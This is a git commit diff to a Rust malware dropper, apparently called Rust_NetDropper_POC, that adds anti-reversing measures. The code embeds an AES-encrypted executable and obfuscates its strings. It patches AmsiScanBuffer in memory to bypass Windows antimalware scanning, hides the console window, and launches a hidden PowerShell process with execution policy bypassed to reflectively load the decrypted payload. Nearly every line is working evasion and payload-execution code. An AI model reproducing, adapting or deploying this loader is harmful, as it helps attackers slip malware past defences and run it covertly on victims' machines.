b2697e1047cef9e979971c76a310d9ba1a18bd9a
Jaxii <jaxmontelongo@gmail.com>
2022-05-20 19:08:14 -0500

    anti-reversing

--- src/main.rs
+++ src/main.rs
@@ -1,9 +1,10 @@
-use std::os::windows::process::CommandExt;
 use base64;
-use include_crypt::{EncryptedFile, include_crypt, obfstr::obfconst};
+use include_crypt::{EncryptedFile, include_crypt};
 use obfstr::obfstr;
 use std::process::Command;
 use std::{ffi::CString, process, ptr};
+use std::ptr::null_mut;
+use Rust_NetDropper_POC::{anti_reversing, sleep_for_15m};
 
 use winapi::{
     um::{
@@ -16,7 +17,12 @@ use winapi::{
             GetProcAddress
         },
         processthreadsapi::GetCurrentProcess,
-        winnt::PAGE_READWRITE
+        winnt::PAGE_READWRITE,
+        wincon::GetConsoleWindow,
+        winuser::{
+            ShowWindow,
+            SW_HIDE
+        },
     },
     shared::{
         minwindef::{
@@ -27,16 +33,17 @@ use winapi::{
     }
 };
 
-fn xref() -> &'static EncryptedFile {
-    static FILE: EncryptedFile = include_crypt!(AES,"C:\\Users\\JaxLa\\Desktop\\Jlaive.exe");
+
+#[inline(never)]
+fn obf_file_ref() -> &'static EncryptedFile {
+    static FILE: EncryptedFile = include_crypt!(AES,"C:\\Users\\Desktop\\File.exe");
     obfstr::xref!(&FILE)
 }
 
-fn patch() {
+fn patch_amsi() {
 
     unsafe {
         // Credits to https://github.com/trickster0/OffensiveRust/tree/master/amsi_bypass
-        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
         let amsi_dll = LoadLibraryA(CString::new(obfstr!("amsi")).unwrap().as_ptr());
         let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new(obfstr!("AmsiScanBuffer")).unwrap().as_ptr());
         let mut old_permissions: DWORD = 0;
@@ -45,8 +52,9 @@ fn patch() {
         if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
             panic!("{}", obfstr!("[-] Failed to change protection."));
         }
-        let written: *mut usize = ptr::null_mut();
+        let written: *mut usize = null_mut();
 
+        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
         if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
             panic!("{}", obfstr!("[-] Failed to overwrite function."));
         }
@@ -54,18 +62,14 @@ fn patch() {
         // Restoring the permissions.
         VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
         //println!("{}", obfstr!("[+] AmsiScanBuffer patched!"));
-
     }
 }
 
 fn hide_console_window() {
-    use std::ptr;
-    use winapi::um::wincon::GetConsoleWindow;
-    use winapi::um::winuser::{ShowWindow, SW_HIDE};
 
     let window = unsafe {GetConsoleWindow()};
     // https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
-    if window != ptr::null_mut() {
+    if window != null_mut() {
         unsafe {
             ShowWindow(window, SW_HIDE);
         }
@@ -74,11 +78,12 @@ fn hide_console_window() {
 
 fn main() {
 
+    anti_reversing();
     //  use litcrypt::{lc, use_litcrypt};
     //  use reqwest;
     //  let bytes =  reqwest::blocking::get(obfstr!("https://example.com/file.exe)).unwrap().bytes();
-    let script = obfstr!("[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"").to_owned() + base64::encode(xref().decrypt()).as_str() + obfstr!("\")).EntryPoint.Invoke($null, $null)");
-        patch();
+    let script = obfstr!("[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"").to_owned() + base64::encode(obf_file_ref().decrypt()).as_str() + obfstr!("\")).EntryPoint.Invoke($null, $null)");
+        patch_amsi();
         if let Ok(command) = Command::new("powershell")
             .arg("-NoProfile")
             .arg("-WindowStyle")
@@ -86,12 +91,11 @@ fn main() {
             .arg("-ExecutionPolicy")
             .arg("Bypass")
             .arg("-Command")
-            .arg(script)
-           // .creation_flags(0x00000001) //attach debugger
+            .arg(script) //attach debugger
             .output()
         {
             println!("{}",obfstr!("success!"));
-            hide_console_window()
+            hide_console_window();
         }
 }
 //
